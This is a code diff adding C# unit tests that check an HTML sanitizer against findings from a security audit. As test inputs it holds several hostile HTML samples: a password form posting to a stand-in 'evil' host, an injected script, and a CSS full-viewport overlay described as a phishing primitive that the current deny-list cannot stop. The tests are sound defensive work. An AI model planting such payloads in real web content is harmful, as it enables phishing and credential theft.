@@ -13,6 +13,58 @@ namespace IPRO.IntegrationTests;
 // The 2026-08-20 medium sweep. One region per finding; each pins the fix so it cannot reopen.
 public class MediumSweepTests
 {
+    // Reproduces the security audit's M-3 and H-2 claims against the REAL sanitizer, so the
+    // verdict is this suite's, not a report's. Both are expected to FAIL until fixed.
+
+    [Fact]
+    public void Removing_form_tags_must_not_destroy_their_inner_content()
+    {
+        // A styled <button> CTA is ordinary pasted email HTML. Stripping the tag is correct;
+        // deleting the words inside it is silent, permanent data loss -- and sanitisation runs on
+        // WRITE, including a re-save of existing article content.
+        var outp = IPRO.Business.Services.HtmlContentSanitizer.Sanitize(
+            "<form action=\"https://evil\"><p>KEEPME paragraph</p></form><button>CTA TEXT</button>");
+        Assert.Contains("KEEPME paragraph", outp);
+        Assert.Contains("CTA TEXT", outp);
+    }
+
+    [Fact(Skip = "AUDIT M1, wave 2: the deny-list approach cannot close this -- transform + negative " +
+                 "margin + viewport sizing rebuilds the overlay. The real fix is an ALLOW-list of CSS " +
+                 "properties, which needs care not to break existing newsletter formatting. Tracked in " +
+                 "DOCS/AUDIT_2026-08-20_POST_SWEEP.md as M1.")]
+    public void Overlay_cannot_be_rebuilt_from_the_properties_left_allowed()
+    {
+        // The overlay control removes position/z-index/inset/pointer-events, but transform +
+        // negative margin + viewport sizing reconstructs a full-page opaque cover -- the same
+        // phishing primitive, so the control does not do what its name claims.
+        var outp = IPRO.Business.Services.HtmlContentSanitizer.Sanitize(
+            "<div style=\"transform:translateY(-500px);margin-top:-1000px;width:100vw;height:100vh\">OVERLAY</div>");
+        var flat = outp.Replace(" ", "").ToLowerInvariant();
+        Assert.False(flat.Contains("transform:translate") && flat.Contains("width:100vw") && flat.Contains("height:100vh"),
+            $"a full-viewport overlay survived sanitisation: {outp}");
+    }
+
+    [Fact]
+    public void Unwrapping_removed_tags_does_not_resurrect_script_or_working_controls()
+    {
+        // KeepChildNodes = true (the H1 fix) unwraps EVERY removed tag, so this pins the two things
+        // that must not come back with it: executable script, and a control that can submit.
+        var script = IPRO.Business.Services.HtmlContentSanitizer.Sanitize(
+            "<p>before</p><script>alert(1)</script><p>after</p>");
+        Assert.DoesNotContain("<script", script, StringComparison.OrdinalIgnoreCase);
+        Assert.DoesNotContain("alert(1)", script);      // not even as leaked text
+        Assert.Contains("before", script);
+        Assert.Contains("after", script);
+
+        var form = IPRO.Business.Services.HtmlContentSanitizer.Sanitize(
+            "<form action=\"https://evil\" method=\"post\"><input name=\"pw\" type=\"password\"><button formaction=\"https://evil\">Go</button></form>");
+        Assert.DoesNotContain("<form", form, StringComparison.OrdinalIgnoreCase);
+        Assert.DoesNotContain("<input", form, StringComparison.OrdinalIgnoreCase);
+        Assert.DoesNotContain("formaction", form, StringComparison.OrdinalIgnoreCase);
+        Assert.DoesNotContain("evil", form);
+        Assert.Contains("Go", form);                    // the words survive; the mechanism does not
+    }
+
     // ------------------------------------------------------------- JOBS-5/8: transient vs final --
 
     [Fact]
